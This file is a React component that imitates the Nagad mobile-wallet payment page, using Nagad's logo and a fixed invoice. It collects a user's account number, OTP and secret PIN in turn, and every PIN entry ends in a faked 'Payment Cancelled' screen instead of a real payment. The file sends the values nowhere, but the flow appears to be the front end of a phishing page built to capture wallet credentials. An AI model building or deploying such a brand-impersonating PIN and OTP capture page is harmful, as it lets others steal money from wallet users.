import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { ShoppingCart, XCircle } from "lucide-react";
import nagadLogoImg from "@/assets/nagad-logo.png";

const NagadPayment = () => {
  const navigate = useNavigate();
  const [isLoading, setIsLoading] = useState(true);
  const [isConfirmLoading, setIsConfirmLoading] = useState(false);
  const [phoneDigits, setPhoneDigits] = useState<string[]>(Array(11).fill(""));
  const [showCancelView, setShowCancelView] = useState(false);
  const [showOtpView, setShowOtpView] = useState(false);
  const [showPinView, setShowPinView] = useState(false);
  const [showFailedView, setShowFailedView] = useState(false);
  const [otpDigits, setOtpDigits] = useState<string[]>(Array(6).fill(""));
  const [pinDigits, setPinDigits] = useState<string[]>(Array(4).fill(""));
  const [resendTimer, setResendTimer] = useState(120);
  const [redirectTimer, setRedirectTimer] = useState(5);
  const [language, setLanguage] = useState<'bn' | 'en'>('en');

  const phoneInputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const otpInputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Initial loading effect
  useEffect(() => {
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 2000);
    return () => clearTimeout(timer);
  }, []);

  // Auto-focus first input when view changes
  useEffect(() => {
    if (!isLoading && !showCancelView && !showFailedView) {
      if (showPinView) {
        pinInputRefs.current[0]?.focus();
      } else if (showOtpView) {
        otpInputRefs.current[0]?.focus();
      } else {
        phoneInputRefs.current[0]?.focus();
      }
    }
  }, [isLoading, showOtpView, showPinView, showCancelView, showFailedView]);

  const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];

  const getPhoneNumber = () => phoneDigits.join("");

  const isValidNumber = () => {
    const phone = getPhoneNumber();
    if (phone.length !== 11) return false;
    const prefix = phone.substring(0, 3);
    return validPrefixes.includes(prefix) && /^\d+$/.test(phone);
  };

  const isValidOtp = () => {
    return otpDigits.every(d => d !== "") && otpDigits.join("").length === 6;
  };

  const isValidPin = () => {
    return pinDigits.every(d => d !== "") && pinDigits.join("").length === 4;
  };

  const getMaskedNumber = () => {
    const phone = getPhoneNumber();
    if (phone.length !== 11) return "";
    return `${phone.substring(0, 3)}****${phone.substring(7)}`;
  };

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (showOtpView && resendTimer > 0) {
      interval = setInterval(() => {
        setResendTimer((prev) => prev - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [showOtpView, resendTimer]);

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (showFailedView && redirectTimer > 0) {
      interval = setInterval(() => {
        setRedirectTimer((prev) => prev - 1);
      }, 1000);
    }
    if (showFailedView && redirectTimer === 0) {
      navigate("/");
    }
    return () => clearInterval(interval);
  }, [showFailedView, redirectTimer, navigate]);

  const handleDigitChange = (
    index: number,
    value: string,
    digits: string[],
    setDigits: React.Dispatch<React.SetStateAction<string[]>>,
    refs: React.MutableRefObject<(HTMLInputElement | null)[]>,
    maxLength: number
  ) => {
    if (!/^\d*$/.test(value)) return;
    
    const newDigits = [...digits];
    newDigits[index] = value.slice(-1);
    setDigits(newDigits);

    // Auto-focus next input
    if (value && index < maxLength - 1) {
      refs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (
    index: number,
    e: React.KeyboardEvent<HTMLInputElement>,
    digits: string[],
    setDigits: React.Dispatch<React.SetStateAction<string[]>>,
    refs: React.MutableRefObject<(HTMLInputElement | null)[]>
  ) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) {
      refs.current[index - 1]?.focus();
    }
  };

  const handleConfirm = () => {
    if (isValidNumber()) {
      setIsConfirmLoading(true);
      setTimeout(() => {
        setIsConfirmLoading(false);
        setShowOtpView(true);
        setResendTimer(120);
      }, 2000);
    }
  };

  const handleOtpConfirm = () => {
    if (isValidOtp()) {
      setIsConfirmLoading(true);
      setTimeout(() => {
        setIsConfirmLoading(false);
        setShowOtpView(false);
        setShowPinView(true);
      }, 2000);
    }
  };

  const handlePinConfirm = () => {
    if (isValidPin()) {
      setIsConfirmLoading(true);
      setTimeout(() => {
        setIsConfirmLoading(false);
        setShowPinView(false);
        setShowFailedView(true);
        setRedirectTimer(5);
      }, 2000);
    }
  };

  const handleCancelClick = () => {
    setShowCancelView(true);
  };

  const handleConfirmCancel = () => {
    navigate("/");
  };

  const handleBackFromCancel = () => {
    setShowCancelView(false);
  };

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  // Render individual digit inputs
  const renderDigitInputs = (
    digits: string[],
    setDigits: React.Dispatch<React.SetStateAction<string[]>>,
    refs: React.MutableRefObject<(HTMLInputElement | null)[]>,
    groupPattern: number[] = [],
    isPassword: boolean = false
  ) => {
    let currentIndex = 0;
    const groups: JSX.Element[] = [];

    if (groupPattern.length === 0) {
      groupPattern = [digits.length];
    }

    groupPattern.forEach((groupSize, groupIndex) => {
      const inputs: JSX.Element[] = [];
      for (let i = 0; i < groupSize; i++) {
        const index = currentIndex + i;
        inputs.push(
          <input
            key={index}
            ref={(el) => (refs.current[index] = el)}
            type={isPassword ? "password" : "tel"}
            inputMode="numeric"
            maxLength={1}
            value={digits[index] || ""}
            onChange={(e) => handleDigitChange(index, e.target.value, digits, setDigits, refs, digits.length)}
            onKeyDown={(e) => handleKeyDown(index, e, digits, setDigits, refs)}
            className="w-8 h-10 bg-white rounded text-center text-gray-800 text-lg font-medium focus:outline-none focus:ring-2 focus:ring-white/50"
          />
        );
      }
      groups.push(
        <div key={groupIndex} className="flex gap-1">
          {inputs}
        </div>
      );
      currentIndex += groupSize;

      // Add separator between groups (except last)
      if (groupIndex < groupPattern.length - 1) {
        groups.push(
          <span key={`sep-${groupIndex}`} className="text-white text-xl font-bold mx-1">-</span>
        );
      }
    });

    return <div className="flex items-center justify-center">{groups}</div>;
  };

  return (
    <div className="min-h-screen bg-gray-200 flex flex-col items-center p-4">
      <div className="w-full max-w-md overflow-hidden flex flex-col" style={{ height: '85vh' }}>
        {isLoading ? (
          /* Loading Screen */
          <div 
            className="flex-1 flex flex-col items-center justify-center rounded-lg"
            style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}
          >
            <div className="relative w-24 h-4 mb-3">
              <span className="absolute w-3.5 h-3.5 rounded-full animate-[dotRotate1_2.4s_linear_infinite]" style={{ backgroundColor: 'rgba(255,255,255,0.3)' }}></span>
              <span className="absolute w-3.5 h-3.5 rounded-full animate-[dotRotate2_2.4s_linear_infinite]" style={{ backgroundColor: 'rgba(255,255,255,0.5)' }}></span>
              <span className="absolute w-3.5 h-3.5 rounded-full animate-[dotRotate3_2.4s_linear_infinite]" style={{ backgroundColor: 'rgba(255,255,255,0.7)' }}></span>
              <span className="absolute w-3.5 h-3.5 rounded-full animate-[dotRotate4_2.4s_linear_infinite]" style={{ backgroundColor: 'rgba(255,255,255,1)' }}></span>
            </div>
            <p className="text-white text-sm font-medium">Loading</p>
          </div>
        ) : showFailedView ? (
          /* Payment Failed Screen */
          <div 
            className="flex-1 flex flex-col items-center justify-center rounded-lg"
            style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}
          >
            <XCircle className="w-12 h-12 text-white mb-4" strokeWidth={1.5} />
            <h3 className="text-white text-center text-lg font-medium mb-2">
              Payment Cancelled
            </h3>
            <p className="text-white text-center text-sm">
              Redirecting to Merchant Website in {redirectTimer}s
            </p>
          </div>
        ) : showCancelView ? (
          /* Cancel Confirmation Screen */
          <div 
            className="flex-1 flex flex-col rounded-lg"
            style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}
          >
            <div className="flex-1 flex flex-col items-center justify-center px-6">
              <div className="w-16 h-16 border-4 border-white rounded-full flex items-center justify-center mb-4">
                <span className="text-white text-3xl">✋</span>
              </div>
              <p className="text-white text-center text-base font-medium">
                Are you sure you want to cancel this payment?
              </p>
            </div>
            <div className="px-6 py-4 flex gap-4">
              <button
                onClick={handleConfirmCancel}
                className="flex-1 bg-transparent border-2 border-white text-white py-3 rounded-lg text-sm font-medium hover:bg-white/10 transition-colors"
              >
                Yes
              </button>
              <button
                onClick={handleBackFromCancel}
                className="flex-1 bg-transparent border-2 border-white text-white py-3 rounded-lg text-sm font-medium hover:bg-white/10 transition-colors"
              >
                No
              </button>
            </div>
          </div>
        ) : (
          /* Main Payment Flow */
          <div 
            className="flex-1 flex flex-col rounded-lg overflow-hidden"
            style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}
          >
            {/* Language Toggle */}
            <div className="flex justify-end p-3">
              <div className="flex rounded overflow-hidden border border-white/30">
                <button 
                  onClick={() => setLanguage('bn')}
                  className={`px-3 py-1 text-xs font-medium transition-colors ${language === 'bn' ? 'bg-white/20 text-white' : 'text-white/70'}`}
                >
                  বাং
                </button>
                <button 
                  onClick={() => setLanguage('en')}
                  className={`px-3 py-1 text-xs font-medium transition-colors ${language === 'en' ? 'bg-white/20 text-white' : 'text-white/70'}`}
                >
                  Eng
                </button>
              </div>
            </div>

            {/* Header with Icon */}
            <div className="flex flex-col items-center pt-2 pb-4">
              <div className="w-16 h-16 mb-3">
                <ShoppingCart className="w-full h-full text-white/80" strokeWidth={1} />
              </div>
              <h1 className="text-white text-xl font-semibold">Easy Payment System</h1>
            </div>

            {/* Invoice Details */}
            <div className="px-6 py-4 space-y-2">
              <div className="flex">
                <span className="text-white font-semibold w-32">Invoice No:</span>
                <span className="text-white/80">B255527202718B</span>
              </div>
              <div className="flex">
                <span className="text-white font-semibold w-32">Total Amount:</span>
                <span className="text-white/80">BDT 434</span>
              </div>
              <div className="flex">
                <span className="text-white font-semibold w-32">Charge:</span>
                <span className="text-white/80">BDT 0</span>
              </div>
            </div>

            {/* Spacer to push content down */}
            <div className="flex-1" />

            {/* Input Section - Fixed Height Container */}
            <div className="px-6 pb-4">
              {showPinView ? (
                <div className="h-32 flex flex-col justify-center">
                  <p className="text-white text-center text-sm font-medium mb-4 h-5">
                    Enter Your Nagad PIN
                  </p>
                  {renderDigitInputs(pinDigits, setPinDigits, pinInputRefs, [4], true)}
                </div>
              ) : showOtpView ? (
                <div className="h-32 flex flex-col justify-center">
                  <p className="text-white text-center text-sm font-medium mb-4 h-5">
                    Enter OTP sent to {getMaskedNumber()}
                  </p>
                  {renderDigitInputs(otpDigits, setOtpDigits, otpInputRefs, [6])}
                  <p className="text-white/70 text-center text-xs mt-3 h-4">
                    {resendTimer > 0 ? `Resend OTP in ${formatTime(resendTimer)}` : 'Resend OTP'}
                  </p>
                </div>
              ) : (
                <div className="h-32 flex flex-col justify-center">
                  <p className="text-white text-center text-sm font-medium mb-4 h-5">
                    Your Nagad Account Number
                  </p>
                  {renderDigitInputs(phoneDigits, setPhoneDigits, phoneInputRefs, [3, 4, 4])}
                </div>
              )}
            </div>

            {/* Terms */}
            <div className="px-6 py-2 h-12 flex items-center justify-center">
              <p className="text-white/80 text-center text-xs">
                By clicking/tapping "Proceed" you are agreeing to our{" "}
                <span className="text-white font-medium underline">Terms and Conditions</span>
              </p>
            </div>

            {/* Action Buttons */}
            <div className="px-6 py-4 flex gap-4">
              <button
                onClick={showPinView ? handlePinConfirm : showOtpView ? handleOtpConfirm : handleConfirm}
                disabled={
                  isConfirmLoading || 
                  (showPinView ? !isValidPin() : showOtpView ? !isValidOtp() : !isValidNumber())
                }
                className={`flex-1 bg-transparent border-2 border-white text-white py-3 rounded-lg text-sm font-medium transition-colors ${
                  (showPinView ? isValidPin() : showOtpView ? isValidOtp() : isValidNumber()) && !isConfirmLoading
                    ? 'hover:bg-white/10'
                    : 'opacity-50 cursor-not-allowed'
                }`}
              >
                {isConfirmLoading ? (
                  <div className="flex justify-center items-center">
                    <div className="relative w-12 h-3">
                      <span className="absolute w-2 h-2 rounded-full animate-[dotRotateBtnA_2.4s_linear_infinite]" style={{ backgroundColor: 'rgba(255,255,255,0.3)' }}></span>
                      <span className="absolute w-2 h-2 rounded-full animate-[dotRotateBtnB_2.4s_linear_infinite]" style={{ backgroundColor: 'rgba(255,255,255,0.5)' }}></span>
                      <span className="absolute w-2 h-2 rounded-full animate-[dotRotateBtnC_2.4s_linear_infinite]" style={{ backgroundColor: 'rgba(255,255,255,0.7)' }}></span>
                      <span className="absolute w-2 h-2 rounded-full animate-[dotRotateBtnD_2.4s_linear_infinite]" style={{ backgroundColor: 'rgba(255,255,255,1)' }}></span>
                    </div>
                  </div>
                ) : (
                  "Proceed"
                )}
              </button>
              <button
                onClick={handleCancelClick}
                className="flex-1 bg-transparent border-2 border-white text-white py-3 rounded-lg text-sm font-medium hover:bg-white/10 transition-colors"
              >
                Close
              </button>
            </div>

            {/* Nagad Logo Footer */}
            <div className="flex justify-center py-6">
              <img src={nagadLogoImg} alt="Nagad" className="h-12 object-contain" />
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default NagadPayment;
